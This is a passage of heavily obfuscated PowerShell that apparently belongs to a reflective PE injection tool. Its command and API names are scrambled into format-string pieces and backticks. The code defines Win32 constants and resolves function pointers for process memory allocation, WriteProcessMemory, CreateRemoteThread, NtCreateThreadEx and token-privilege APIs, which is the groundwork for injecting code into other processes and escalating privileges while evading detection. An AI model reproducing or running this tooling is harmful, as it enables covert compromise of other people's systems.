		${W`I`N32cONsTaNTS} | &("{1}{0}{2}{3}"-f'em','Add-M','b','er') -MemberType ("{3}{2}{0}{1}" -f 'er','ty','eProp','Not') -Name ("{4}{0}{1}{3}{2}" -f'EX','ECUTABLE_','MAGE','I','IMAGE_FILE_') -Value 0x0002
		${wIN`32co`Nst`AN`Ts} | &("{0}{2}{1}" -f'Add','er','-Memb') -MemberType ("{1}{3}{0}{2}" -f'Proper','Not','ty','e') -Name ("{4}{1}{0}{2}{3}" -f'GE_FIL','MA','E_DL','L','I') -Value 0x2000
		${WiN3`2c`O`N`StantS} | &("{0}{1}{2}" -f'A','dd-M','ember') -MemberType ("{2}{1}{0}" -f 'y','t','NoteProper') -Name ("{5}{1}{0}{2}{6}{3}{7}{4}"-f 'DLLCHA','E_','RAC','T','_DYNAMIC_BASE','IMAG','TERIS','ICS') -Value 0x40
		${wi`N`32cONsT`ANts} | &("{1}{0}{2}"-f'Membe','Add-','r') -MemberType ("{1}{3}{0}{2}"-f 'roper','N','ty','oteP') -Name ("{5}{1}{2}{6}{0}{3}{4}"-f'CT','GE_DLLC','HA','ERISTICS_NX_COMP','AT','IMA','RA') -Value 0x100
		${W`i`N32CoNStaNTS} | &("{2}{0}{3}{1}"-f'M','r','Add-','embe') -MemberType ("{1}{0}{2}{3}"-f 'e','NoteProp','r','ty') -Name ("{1}{0}{3}{2}"-f'R','MEM_','LEASE','E') -Value 0x8000
		${WiN3`2CONST`A`NtS} | &("{2}{0}{1}" -f'-','Member','Add') -MemberType ("{2}{1}{0}" -f 'rty','tePrope','No') -Name ("{3}{1}{2}{0}"-f'UERY','EN','_Q','TOK') -Value 0x0008
		${win32`Con`St`AnTs} | &("{0}{3}{1}{2}"-f 'Add-M','mbe','r','e') -MemberType ("{1}{2}{0}" -f'ty','NoteProp','er') -Name ("{1}{4}{2}{6}{3}{5}{7}{0}" -f'S','TOKEN_A','ST','PR','DJU','I','_','VILEGE') -Value 0x0020
		${w`In32cON`sTan`TS} | &("{0}{2}{1}" -f'A','r','dd-Membe') -MemberType ("{2}{3}{1}{0}"-f 'ty','oper','N','otePr') -Name ("{0}{1}{2}{3}{4}"-f 'S','E_','PRI','VILEGE','_ENABLED') -Value 0x2
		${wi`N3`2conSTAntS} | &("{3}{1}{0}{2}" -f 'e','-M','mber','Add') -MemberType ("{2}{0}{1}"-f't','eProperty','No') -Name ("{0}{2}{3}{1}" -f 'ERROR','TOKEN','_','NO_') -Value 0x3f0
		
		return ${WIn32c`onst`ANtS}
	}

	Function gET-WI`N32fu`N`C`Ti`ONS
	{
		${wIN32`FUnCT`iO`Ns} = &("{1}{3}{2}{0}"-f'ct','New','bje','-O') ("{0}{2}{1}" -f 'Sys','Object','tem.')
		
		${vI`RtuA`l`ALlOCAdDR} = &("{0}{1}{2}" -f 'Get-Proc','Addres','s') ("{1}{2}{0}"-f'2.dll','ker','nel3') ("{1}{3}{0}{2}"-f 'll','Vi','oc','rtualA')
		${v`i`RtuaLaL`LocdE`LE`g`ATe} = &("{2}{0}{1}{4}{3}"-f'lega','teT','Get-De','pe','y') @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${vIr`TUa`L`ALlOC} =   ( &("{1}{0}{2}"-f'AB','Get-VaRi','LE') 69pB )."v`ALUe"::("{3}{1}{0}{6}{4}{2}{5}" -f 'at','tDeleg','i','Ge','unctionPo','nter','eForF').Invoke(${virTu`ALA`ll`oC`AdDR}, ${V`iRTu`A`laLLOCDELe`G`Ate})
		${w`IN32FuNctIO`NS} | &("{0}{2}{1}"-f 'Add-Mem','r','be') ("{2}{0}{3}{1}"-f'o','roperty','N','teP') -Name ("{3}{1}{2}{0}"-f'oc','al','All','Virtu') -Value ${V`ir`T`UAlalloc}
		
		${vIR`TuALaLLo`C`exAdDR} = &("{1}{2}{4}{0}{3}"-f 'cA','G','e','ddress','t-Pro') ("{2}{1}{3}{0}"-f 'l','.d','kernel32','l') ("{3}{0}{2}{4}{1}"-f 'tua','x','lAlloc','Vir','E')
		${viR`TU`AlalL`OC`e`xDeL`E`gate} = &("{2}{0}{3}{4}{1}"-f'e','teType','Get-Del','g','a') @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		${VirTu`ALa`LL`ocex} =   (&("{1}{0}{2}" -f 'Ariab','V','le')  ("6"+"9PB") -valU )::("{2}{4}{0}{5}{3}{6}{1}" -f 'orFu','nter','GetD','onPo','elegateF','ncti','i').Invoke(${VirtuAlA`l`lO`CEX`ADDR}, ${Vir`TuALALLO`CE`xDEleg`AtE})
		${wIn32`F`U`N`cTioNS} | &("{3}{0}{2}{1}" -f 'dd','Member','-','A') ("{0}{1}{2}"-f 'NoteProper','t','y') -Name ("{4}{3}{0}{2}{1}" -f 'Alloc','x','E','ual','Virt') -Value ${VI`R`TUAlA`lloC`Ex}
		
		${Me`mcp`y`ADDr} = &("{2}{1}{0}{3}" -f'Ad','et-Proc','G','dress') ("{2}{1}{0}"-f'll','.d','msvcrt') ("{2}{0}{1}" -f 'emcp','y','m')
		${MEMcP`yDeL`egA`TE} = &("{0}{4}{3}{1}{2}" -f 'Get-D','e','Type','t','elega') @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		${M`emc`Py} =  ( &("{1}{0}{2}"-f 'ABl','VarI','E') ('69p'+'b')  )."V`Alue"::("{5}{3}{1}{0}{4}{2}" -f'i','ct','Pointer','gateForFun','on','GetDele').Invoke(${mEm`CPY`A`DDr}, ${MeM`cPYd`el`eGa`TE})
		${W`iN32F`UNC`Ti`oNS} | &("{0}{2}{1}"-f 'Add-M','r','embe') -MemberType ("{2}{0}{1}" -f'ropert','y','NoteP') -Name ("{1}{0}"-f'cpy','mem') -Value ${meMc`py}
		
		${me`M`seTaD`dr} = &("{0}{3}{2}{4}{1}" -f 'G','s','ProcAddr','et-','es') ("{2}{1}{0}"-f '.dll','svcrt','m') ("{1}{0}" -f't','memse')
		${MeMSE`TdELeGa`Te} = &("{2}{1}{3}{0}" -f'e','t-De','Ge','legateTyp') @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		${Mems`eT} =   ( &("{0}{1}{3}{2}" -f'gEt-','V','aBle','ARI') 69pb -vALue  )::("{7}{3}{4}{6}{5}{2}{1}{0}"-f'ointer','nP','tio','D','el','gateForFunc','e','Get').Invoke(${ME`m`SeTAd`DR}, ${meM`s`e`Td`eLEGAte})
		${W`I`N3`2FUn`CTiONS} | &("{2}{0}{3}{1}" -f'd','ember','A','d-M') -MemberType ("{2}{1}{0}" -f'erty','teProp','No') -Name ("{1}{2}{0}" -f 'set','me','m') -Value ${ME`M`seT}
		
		${lOAdL`ib`Ra`RYAddr} = &("{3}{1}{0}{4}{2}" -f'Addre','et-Proc','s','G','s') ("{3}{0}{2}{1}" -f 'e','l32.dll','rne','k') ("{2}{0}{1}" -f'o','adLibraryA','L')
		${L`oa`d`l`Ibr`A`RYDElEGatE} = &("{3}{4}{1}{0}{2}" -f 'ateTyp','eg','e','Ge','t-Del') @([String]) ([IntPtr])
		${LO`A`DlIBRA`RY} =   ( &("{1}{0}{2}"-f 'E','get-iT','M') ('VaRiAbLE:'+'6'+'9'+'pB'))."va`LuE"::("{1}{3}{0}{2}{4}"-f 'teForFunctionPo','GetDeleg','in','a','ter').Invoke(${l`OADLI`BRA`RyADdR}, ${Loadl`IB`RaRydELeG`ATe})
		${W`In32F`U`NCT`ions} | &("{0}{1}{2}"-f'Add-M','em','ber') -MemberType ("{3}{1}{2}{0}" -f'roperty','ote','P','N') -Name ("{1}{2}{0}{3}"-f'adLibra','L','o','ry') -Value ${lOa`Dl`iBrary}
		
		${g`E`TPRocAD`dr`Es`sAD`dR} = &("{2}{1}{4}{3}{0}"-f 'ress','Pr','Get-','Add','oc') ("{2}{1}{0}"-f '2.dll','3','kernel') ("{0}{2}{3}{4}{1}"-f'Ge','ddress','tPr','o','cA')
		${G`eT`P`RocAddRe`SS`DELE`gAte} = &("{1}{0}{2}" -f 'le','Get-De','gateType') @([IntPtr], [String]) ([IntPtr])
		${ge`Tpro`C`A`ddREsS} =   ( &("{3}{2}{0}{1}"-f 'I','ABLe','r','geT-va') 69Pb  -va)::("{0}{3}{2}{5}{1}{4}" -f'GetD','Point','rFun','elegateFo','er','ction').Invoke(${G`eT`PR`OcAdDr`esSAD`dR}, ${ge`TpRocaddREss`DELEG`A`Te})
		${W`In32`FuN`ct`Ions} | &("{2}{1}{0}" -f'Member','dd-','A') -MemberType ("{2}{3}{1}{0}"-f 'ty','er','N','oteProp') -Name ("{1}{2}{4}{0}{3}" -f'dr','GetP','rocA','ess','d') -Value ${GeT`pR`ocADD`REsS}
		
		${ge`TpRo`caDd`Re`Ss`iNT`PtRa`DDR} = &("{3}{1}{0}{2}"-f 'cAd','Pro','dress','Get-') ("{1}{2}{0}"-f 'nel32.dll','k','er') ("{2}{1}{0}{3}"-f'cAd','ro','GetP','dress') 
		${G`Etp`R`ocA`DdRE`SSiNt`PT`RDELeG`ATE} = &("{0}{1}{3}{2}" -f 'Get-Dele','g','ype','ateT') @([IntPtr], [IntPtr]) ([IntPtr])
		${getprOcaDdrE`S`SIN`TpTR} =   (&("{2}{3}{1}{0}"-f 'E','L','gEt','-VaRIab')  ("69p"+"B") -vaLUe)::("{0}{4}{5}{3}{1}{2}{6}"-f'GetDele','t','ionPointe','eForFunc','ga','t','r').Invoke(${GET`pROC`ADD`R`ES`sI`NtptraD`DR}, ${ge`TPrO`c`A`ddResS`INTPTR`deleGaTe})
		${wiN32FU`N`Cti`ons} | &("{0}{2}{1}" -f 'Add','r','-Membe') -MemberType ("{3}{0}{2}{1}"-f 'otePrope','y','rt','N') -Name ("{0}{1}{5}{2}{3}{4}"-f'G','et','dd','ressI','ntPtr','ProcA') -Value ${gET`P`ROcAddRe`S`SI`NTPTR}
		
		${VIR`TUAL`F`Re`EadDr} = &("{3}{0}{4}{2}{1}"-f 'et-Proc','ss','e','G','Addr') ("{1}{0}{2}{3}" -f'ern','k','e','l32.dll') ("{2}{0}{1}"-f't','ualFree','Vir')
		${V`IrTualfrE`e`deLEGaTE} = &("{3}{4}{2}{1}{0}"-f'Type','te','ega','Get-D','el') @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${vi`RTual`FR`ee} =   (&("{1}{0}"-f 'R','Di') ("VAR"+"IabL"+"E:"+"69P"+"b"))."VAL`UE"::("{6}{4}{5}{3}{2}{1}{0}" -f 'ointer','nP','io','unct','t','eForF','GetDelega').Invoke(${v`ir`TUALF`ReEADDr}, ${vi`Rt`UalFRe`eD`eLeGatE})
		${WiN3`2fU`NctiO`NS} | &("{1}{0}{2}" -f'd-Mem','Ad','ber') ("{2}{1}{0}"-f 'y','t','NoteProper') -Name ("{0}{1}{3}{2}"-f 'V','i','lFree','rtua') -Value ${VirtUAL`F`R`ee}
		
		${vi`RTU`A`LFRe`eexAddr} = &("{2}{0}{1}" -f 'rocAddres','s','Get-P') ("{0}{1}{2}"-f'ke','rne','l32.dll') ("{0}{1}{2}"-f'Vir','tualFr','eeEx')
		${VIrTuAlfrE`EE`XD`ele`gatE} = &("{1}{0}{3}{2}{4}"-f 'et-','G','ega','Del','teType') @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		${viR`TualF`REeEX} =   ${6`9Pb}::("{5}{3}{6}{2}{1}{0}{4}"-f 'nctionPoi','u','teForF','tDel','nter','Ge','ega').Invoke(${vIR`T`UAl`FReeEXAdDr}, ${vI`RtUa`LF`RE`eexd`ElegA`TE})
		${W`in3`2funC`TIoNs} | &("{0}{2}{3}{1}"-f'A','ember','dd-','M') ("{3}{2}{1}{0}"-f'ty','er','oteProp','N') -Name ("{1}{0}{2}{3}" -f 'tualFre','Vir','e','Ex') -Value ${viRT`UaLfre`eEx}
		
		${vIr`T`UaLPRO`T`ec`TAdDr} = &("{0}{3}{4}{2}{1}"-f'G','s','ProcAddres','et','-') ("{0}{1}{2}" -f 'ker','nel','32.dll') ("{4}{0}{1}{2}{3}" -f'tualP','r','otec','t','Vir')
		${V`iRtUaL`proTe`Ctdel`Ega`Te} = &("{1}{3}{4}{2}{0}"-f 'pe','Get-De','Ty','le','gate') @([IntPtr], [UIntPtr], [UInt32],  (&("{0}{2}{3}{1}" -f 'geT-V','blE','a','RiA')  ('0'+'4LJ2')  )."val`UE".("{3}{2}{1}{0}{4}"-f 'RefT','y','B','Make','ype').Invoke()) ([Bool])
		${vIr`Tual`p`RoTEcT} =  (&("{0}{3}{2}{1}"-f'G','ABLE','-VaRi','eT') 69pb  )."V`AluE"::("{6}{4}{1}{5}{3}{2}{0}"-f 'ointer','ateF','tionP','Func','tDeleg','or','Ge').Invoke(${viR`TUa`lpRoteCTaD`dr}, ${viRTua`Lp`ROte`C`TDE`leGate})
		${win`32f`U`N`cTIONs} | &("{2}{1}{0}"-f'-Member','d','Ad') ("{1}{2}{3}{0}"-f'y','NoteP','r','opert') -Name ("{0}{2}{4}{1}{3}" -f 'Vir','t','tu','ect','alPro') -Value ${V`IRtu`ALpr`oTEcT}
		
		${g`ETmo`DuLeha`NdlE`ADDR} = &("{3}{0}{2}{1}" -f'rocA','ress','dd','Get-P') ("{0}{2}{1}{3}"-f 'k','rne','e','l32.dll') ("{0}{4}{3}{2}{1}" -f'Get','eA','ndl','leHa','Modu')
		${getM`Odu`l`EHaN`Dl`e`dele`GAte} = &("{3}{2}{0}{1}"-f'Typ','e','t-Delegate','Ge') @([String]) ([IntPtr])
		${G`ETM`odule`Ha`NDle} =  (&("{0}{1}" -f'di','R') ("{0}{2}{1}"-f'vaRIab','e:69Pb','L') )."V`ALUe"::("{5}{3}{2}{1}{6}{4}{0}"-f'inter','teForFunc','lega','De','onPo','Get','ti').Invoke(${g`etmOd`U`LEHAndL`E`AdDR}, ${GETM`o`dULE`hA`NdLedEle`gA`Te})
		${w`IN32fuN`cTio`Ns} | &("{0}{3}{1}{2}" -f 'Add-Me','e','r','mb') ("{3}{1}{2}{0}"-f'y','e','Propert','Not') -Name ("{0}{2}{1}"-f 'Ge','ndle','tModuleHa') -Value ${g`ETMOD`ULeH`ANDLe}
		
		${FREEli`B`RaRyA`DDr} = &("{2}{1}{0}" -f 'ss','et-ProcAddre','G') ("{0}{3}{1}{2}" -f'k','2','.dll','ernel3') ("{2}{0}{1}" -f'eeLibr','ary','Fr')
		${frEE`lI`BRa`RyDel`EgAtE} = &("{2}{1}{0}{3}" -f'elega','D','Get-','teType') @([IntPtr]) ([Bool])
		${f`REe`LI`BRARy} =   ${6`9Pb}::("{7}{4}{6}{3}{0}{2}{1}{5}"-f 'c','nt','tionPoi','teForFun','l','er','ega','GetDe').Invoke(${fRe`eL`iBRA`RyadDr}, ${FREeli`B`R`Ar`Y`deLEGATE})
		${WiN3`2f`Unc`TioNs} | &("{2}{0}{1}"-f 'd-M','ember','Ad') -MemberType ("{2}{3}{0}{1}"-f'pert','y','NotePr','o') -Name ("{0}{2}{1}" -f'FreeLib','ry','ra') -Value ${FrE`ElIbr`A`RY}
		
		${O`p`enprOcE`S`SADdR} = &("{1}{3}{0}{2}"-f'roc','Get-','Address','P') ("{3}{0}{2}{1}" -f'erne','l','l32.dl','k') ("{2}{1}{0}" -f'ocess','Pr','Open')
	    ${O`peNP`R`Oc`esSdel`egATe} = &("{3}{0}{4}{2}{1}" -f't-','egateType','l','Ge','De') @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    ${Op`ENprOcE`Ss} =  (&('Gi')  ("{1}{0}{2}{3}{4}"-f 'AR','v','IAblE:','6','9pB'))."V`ALUe"::("{0}{2}{4}{3}{7}{1}{5}{6}"-f 'G','ForFunction','e','legat','tDe','P','ointer','e').Invoke(${oPenP`R`ocesSaddr}, ${Openp`ROCes`s`DeLegA`Te})
		${win3`2fu`N`cti`oNS} | &("{2}{1}{0}{3}" -f '-Me','dd','A','mber') -MemberType ("{2}{1}{0}" -f'teProperty','o','N') -Name ("{1}{3}{0}{2}"-f 'Proces','Op','s','en') -Value ${OPENproc`E`Ss}
		
		${Wa`It`FOR`siNgLeOb`JEcTaDDr} = &("{0}{2}{1}{3}" -f 'Ge','cAdd','t-Pro','ress') ("{2}{0}{1}{3}"-f '.','dl','kernel32','l') ("{1}{4}{3}{2}{0}" -f'ct','W','e','eObj','aitForSingl')
	    ${wAiT`FOrsiNgle`o`Bjec`T`dE`l`eGATe} = &("{0}{2}{4}{1}{3}" -f 'Ge','eleg','t','ateType','-D') @([IntPtr], [UInt32]) ([UInt32])
	    ${wa`iTFOrsiN`GLe`OB`JE`ct} =   (  &("{0}{1}{2}" -f 'chI','l','dIteM')  ("{2}{1}{0}"-f'69pb','AriaBLE:','v'))."VAL`Ue"::("{8}{2}{3}{0}{7}{1}{6}{4}{5}"-f 'r','nctionP','el','egateFo','nt','er','oi','Fu','GetD').Invoke(${wA`ItFOrsIN`g`LE`oBJE`cta`D`dr}, ${waItFOrsinGLE`o`BJectDELE`G`AtE})
		${Wi`N3`2F`UncTi`ons} | &("{1}{0}{2}" -f'dd-','A','Member') -MemberType ("{2}{1}{0}" -f'y','rt','NotePrope') -Name ("{3}{4}{0}{2}{1}" -f 'orSingleO','ect','bj','Wait','F') -Value ${wa`itFOr`singleObj`ECT}
		
		${w`R`ITe`proCessM`emorYaddr} = &("{4}{3}{1}{2}{0}" -f's','ddr','es','et-ProcA','G') ("{0}{1}{3}{2}"-f 'ke','rnel','2.dll','3') ("{0}{1}{2}{3}" -f'Wri','te','ProcessMe','mory')
        ${w`RitEp`RoCESsMem`o`Ry`delEgATE} = &("{4}{2}{0}{1}{3}"-f 'ateT','y','leg','pe','Get-De') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],   (&("{1}{2}{0}"-f 'IabLe','geT-v','ar') ("{0}{1}"-f'v1','b') )."vAl`UE".("{2}{0}{1}"-f'efTy','pe','MakeByR').Invoke()) ([Bool])
        ${W`Ri`TEpROCes`SMe`moRY} =   ${6`9Pb}::("{5}{6}{0}{3}{1}{4}{2}"-f'Deleg','unctionPo','nter','ateForF','i','Ge','t').Invoke(${wRI`TePROC`esSMemoRYa`Ddr}, ${WRI`TepR`oCe`SSMEMo`RYD`elEGA`Te})
		${WIN`32fu`NCTI`Ons} | &("{1}{2}{0}"-f '-Member','A','dd') -MemberType ("{1}{0}{2}"-f 'e','Not','Property') -Name ("{1}{0}{3}{2}"-f 'r','WriteP','Memory','ocess') -Value ${WR`I`TEpRo`ceSsMeM`ORy}
		
		${r`eADp`RO`ceSSm`E`moRya`DdR} = &("{0}{1}{2}{3}"-f 'Ge','t-P','rocAddres','s') ("{3}{2}{0}{1}"-f'32.','dll','el','kern') ("{2}{3}{1}{0}"-f'sMemory','Proces','R','ead')
        ${Re`AdP`R`OCEssMeMOR`ydelE`GaTE} = &("{1}{3}{2}{0}" -f 'Type','Get','elegate','-D') @([IntPtr], [IntPtr], [IntPtr], [UIntPtr],  ( &('gi')  ("{2}{1}{0}"-f ':V1B','E','VaRiaBl') )."va`lue".("{0}{1}{4}{2}{3}" -f'M','a','y','pe','keByRefT').Invoke()) ([Bool])
        ${R`ea`DP`Roce`ssMeMO`RY} =   (&("{0}{1}" -f 'VarI','aBLE')  69Pb -valUEONLy)::("{6}{5}{0}{3}{1}{2}{4}"-f 'n','on','Pointe','cti','r','Fu','GetDelegateFor').Invoke(${Re`A`DprocEs`SmeMORYA`Ddr}, ${R`eA`DPROCESsMe`MorYd`E`leGAtE})
		${W`iN32F`UN`CtIo`Ns} | &("{2}{0}{1}"-f 'dd-Memb','er','A') -MemberType ("{0}{2}{1}"-f'Note','erty','Prop') -Name ("{0}{3}{2}{1}"-f 'R','mory','ssMe','eadProce') -Value ${rEadp`RoC`ESSM`E`M`oRY}
		
		${creAtE`ReMoT`ethRea`daDDr} = &("{2}{3}{1}{0}" -f 'ress','dd','Ge','t-ProcA') ("{1}{0}{2}"-f'rnel3','ke','2.dll') ("{3}{0}{1}{2}"-f 'teRemo','te','Thread','Crea')
        ${crEAt`E`RemOT`eT`HREA`dde`Leg`ATE} = &("{3}{0}{2}{1}" -f 't-Dele','pe','gateTy','Ge') @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        ${C`Rea`TErEm`OtEtHREAD} =   ${6`9Pb}::("{2}{5}{1}{0}{4}{3}" -f'n','i','GetD','er','t','elegateForFunctionPo').Invoke(${crEA`T`ere`moTeTh`R`EA`dAddR}, ${CrEA`TeR`emO`T`EtHr`Ea`dDeLeGAtE})
		${WI`N32fU`NcTi`O`Ns} | &("{1}{3}{0}{2}"-f'Memb','Ad','er','d-') -MemberType ("{0}{2}{1}{3}" -f'NotePrope','t','r','y') -Name ("{1}{0}{2}{3}" -f 'oteT','CreateRem','hrea','d') -Value ${creATe`Re`mOtetH`R`EAd}
		
		${gete`Xit`cODE`ThREad`AD`DR} = &("{4}{3}{1}{0}{2}"-f 're','rocAdd','ss','P','Get-') ("{0}{1}{2}"-f 'k','ernel32.','dll') ("{0}{2}{3}{4}{1}"-f 'G','read','etExitCode','T','h')
        ${GEtE`XIt`CoD`eT`hREaDDe`LEGAtE} = &("{2}{1}{3}{0}" -f'pe','t','Ge','-DelegateTy') @([IntPtr],  (  &("{2}{1}{0}" -f 'TEM','dI','Chil')  ("v"+"AriAb"+"Le:9"+"1Tr")  )."VAL`Ue".("{1}{3}{0}{2}"-f'yRefT','Mak','ype','eB').Invoke()) ([Bool])
        ${gETEx`I`TCoD`ETHRe`Ad} =  ( &("{1}{0}{2}" -f 'IABl','VAr','e')  ("6"+"9Pb")  )."v`ALUE"::("{4}{1}{0}{5}{3}{2}" -f 'ct','tDelegateForFun','Pointer','on','Ge','i').Invoke(${gETeXI`T`CoDE`ThRE`AdadDR}, ${GEteXI`T`C`odETHrE`AdDEleg`ATe})
		${WIn32`Fu`Nc`TiO`Ns} | &("{3}{2}{1}{0}" -f 'ember','M','-','Add') -MemberType ("{3}{2}{1}{0}"-f 'operty','Pr','ote','N') -Name ("{0}{2}{1}{3}{4}"-f'GetExi','CodeThr','t','e','ad') -Value ${gEtEX`ITcOdE`THRE`Ad}
		
		${O`PenThReaDTOKe`N`ADdR} = &("{1}{0}{2}" -f'roc','Get-P','Address') ("{1}{3}{0}{2}" -f'l','Ad','l','vapi32.d') ("{2}{0}{4}{3}{1}"-f'pen','dToken','O','ea','Thr')
        ${oPEnth`R`e`AdtOKendeLegA`Te} = &("{3}{1}{0}{2}" -f'elegat','-D','eType','Get') @([IntPtr], [UInt32], [Bool],  (&("{2}{1}{0}" -f 'AbLE','ARi','V')  ("{1}{0}"-f'm1AJ','2')  )."Val`Ue".("{0}{2}{1}"-f 'Make','RefType','By').Invoke()) ([Bool])
        ${opENTHreA`dtO`K`en} =  (  &("{0}{1}" -f'i','tEM')  ('va'+'riAbl'+'e:69Pb')  )."vA`Lue"::("{1}{0}{7}{4}{3}{6}{5}{2}"-f 'tDel','Ge','onPointer','o','eF','Functi','r','egat').Invoke(${oPe`N`ThrEaDT`O`K`eNaddR}, ${opENTH`R`E`AdTO`kE`NDE`LeGAtE})
		${wiN32F`U`NctIoNs} | &("{2}{1}{0}" -f 'er','dd-Memb','A') -MemberType ("{2}{1}{0}{3}" -f 'pe','otePro','N','rty') -Name ("{4}{1}{0}{3}{2}"-f 'o','T','en','k','OpenThread') -Value ${ope`NtHrEA`dtoken}
		
		${G`eT`c`URreNTTHrE`AdA`ddR} = &("{3}{4}{1}{0}{2}"-f'e','ocAddr','ss','Get-','Pr') ("{0}{3}{2}{1}"-f'kernel3','dll','.','2') ("{1}{2}{0}{3}{4}"-f'Cu','Ge','t','rrentThre','ad')
        ${gET`curreNTTH`Re`ADdeLE`GaTe} = &("{0}{2}{1}{3}"-f'Get-','elegat','D','eType') @() ([IntPtr])
        ${GET`cURren`Tt`hRe`Ad} =  ${69`pB}::("{5}{3}{1}{2}{6}{4}{0}"-f'ter','ateF','orFunc','eleg','in','GetD','tionPo').Invoke(${Ge`Tc`UrrENt`THr`eADa`dDr}, ${GE`TCU`R`RENtt`hreadDeLe`GAtE})
		${w`IN3`2`FUnctions} | &("{2}{0}{1}" -f 'be','r','Add-Mem') -MemberType ("{1}{0}{2}" -f'rope','NoteP','rty') -Name ("{1}{2}{3}{0}" -f 'd','GetC','urr','entThrea') -Value ${G`etcUrr`e`NTtHrEAd}
		
		${ADjUStT`o`K`En`PriVIlEgEsADDr} = &("{4}{2}{1}{0}{3}"-f 'Ad','-Proc','et','dress','G') ("{1}{0}{3}{2}" -f'api3','Adv','l','2.dl') ("{2}{0}{4}{3}{1}" -f'enPr','es','AdjustTok','leg','ivi')
        ${ADJ`UStt`oKeNPr`i`VIl`eG`eS`DElE`ga`TE} = &("{1}{0}{2}{3}" -f'gate','Get-Dele','Ty','pe') @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        ${a`djUsTto`KeN`pR`IViL`EG`Es} =   ${69`PB}::("{5}{2}{3}{0}{1}{4}"-f'n','t','elega','teForFunctionPoi','er','GetD').Invoke(${ad`jUs`TToKENPrIvI`leG`e`SadDR}, ${A`dJu`sTTOkeNpR`i`VIL`eg`e`sDeLEg`ATe})
		${wI`N32fU`N`CTionS} | &("{2}{0}{1}" -f'Membe','r','Add-') -MemberType ("{1}{2}{0}" -f 'y','NoteP','ropert') -Name ("{1}{2}{3}{0}"-f 'rivileges','A','djustToken','P') -Value ${adju`s`TtoKEn`PrI`VilE`g`ES}
		
		${lO`OK`UpP`Ri`ViLEGE`V`AlUeadDr} = &("{4}{3}{2}{1}{0}" -f'ss','ddre','ocA','et-Pr','G') ("{2}{0}{1}"-f'ap','i32.dll','Adv') ("{2}{0}{3}{1}{4}" -f 'le','Valu','LookupPrivi','ge','eA')
        ${LooKupPrivi`lEGE`VAl`Ued`eleGAtE} = &("{2}{3}{0}{1}" -f 'teTyp','e','G','et-Delega') @([String], [String], [IntPtr]) ([Bool])
        ${LoO`kU`pPRiViLe`gEvAl`UE} =   ${69`Pb}::("{0}{3}{1}{7}{4}{2}{5}{6}"-f'G','tD','o','e','ti','nP','ointer','elegateForFunc').Invoke(${looK`UPpRIV`IL`eGEvAL`U`eA`ddR}, ${lO`o`kUPPR`IVIlEgE`V`ALuE`dE`lEgA`TE})
		${Wi`N32fu`Nc`TiO`Ns} | &("{1}{2}{0}"-f 'ember','Add-','M') -MemberType ("{2}{0}{1}" -f't','eProperty','No') -Name ("{4}{1}{0}{2}{3}"-f 'rivile','pP','geVal','ue','Looku') -Value ${lookuPpR`I`V`i`le`G`evaLuE}
		
		${I`mPe`RsonAteSELFad`dR} = &("{2}{0}{1}"-f 'et-ProcAd','dress','G') ("{2}{0}{1}"-f'.dl','l','Advapi32') ("{4}{2}{1}{3}{0}" -f 'elf','r','e','sonateS','Imp')
        ${I`m`PE`RSO`NATE`s`elFDELeG`Ate} = &("{2}{0}{3}{1}{4}"-f '-Dele','ateT','Get','g','ype') @([Int32]) ([Bool])
        ${ImpEr`S`On`ATesELf} =   ( &("{1}{0}"-f'eM','iT')  ("{0}{2}{1}"-f 'varIAbL','b','E:69p'))."va`Lue"::("{1}{0}{3}{6}{2}{4}{5}"-f 'tDele','Ge','For','ga','Functio','nPointer','te').Invoke(${IMPe`R`soNaTes`elFA`Ddr}, ${i`M`PErsON`Ate`S`elfDeLegA`TE})
		${win32`FUN`cTIo`Ns} | &("{1}{0}{2}"-f'dd-','A','Member') -MemberType ("{1}{0}{2}"-f'teProp','No','erty') -Name ("{2}{1}{0}" -f'eSelf','at','Imperson') -Value ${Im`perS`OnateS`elF}
		
		
        if ((  (&("{0}{1}" -f 'D','IR') ('VAR'+'iab'+'LE:fV62'+'O'+'G')  )."VA`lUe"::"O`SVe`RsIon"."vErs`IoN" -ge (&("{1}{2}{0}" -f 'bject','Ne','w-O') ("{1}{0}" -f 'n','Versio') 6,0)) -and (  (  &("{0}{1}" -f 'g','cI') ("V"+"arI"+"abL"+"E:Fv62oG")  )."v`ALUE"::"osVe`RS`I`On"."vErsi`on" -lt (&("{1}{2}{0}"-f 'bject','New-','O') ("{0}{1}"-f'Versi','on') 6,2))) {
		    ${NTCREate`THr`EAd`e`xADDr} = &("{1}{0}{2}{3}{4}"-f'ocA','Get-Pr','ddre','s','s') ("{2}{1}{0}" -f'.dll','Dll','Nt') ("{1}{2}{3}{4}{0}" -f'Ex','NtC','rea','t','eThread')
            ${N`TcREAtE`THRE`Ad`exDEle`Ga`Te} = &("{4}{1}{2}{0}{3}"-f'eT','lega','t','ype','Get-De') @( ( &("{0}{1}" -f 'DI','R') ("v"+"AriABl"+"E"+":2m1"+"aj")  )."v`AlUE".("{1}{4}{0}{2}{3}"-f 'keByRefT','M','yp','e','a').Invoke(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            ${ntCrEA`T`EtHR`EaDeX} =   ${6`9pB}::("{2}{6}{4}{5}{0}{1}{3}" -f 'nPo','i','Ge','nter','ate','ForFunctio','tDeleg').Invoke(${NT`c`ReATETHre`A`De`xAdDR}, ${nTcr`e`A`TET`hrEaDe`XDEleg`ATe})
		    ${W`in3`2fuNcTIoNS} | &("{0}{2}{1}" -f 'Add','ber','-Mem') -MemberType ("{3}{0}{1}{2}"-f'rop','e','rty','NoteP') -Name ("{3}{1}{0}{2}{4}" -f'hr','CreateT','ea','Nt','dEx') -Value ${ntc`REat`E`T`HreAdeX}
        }
		
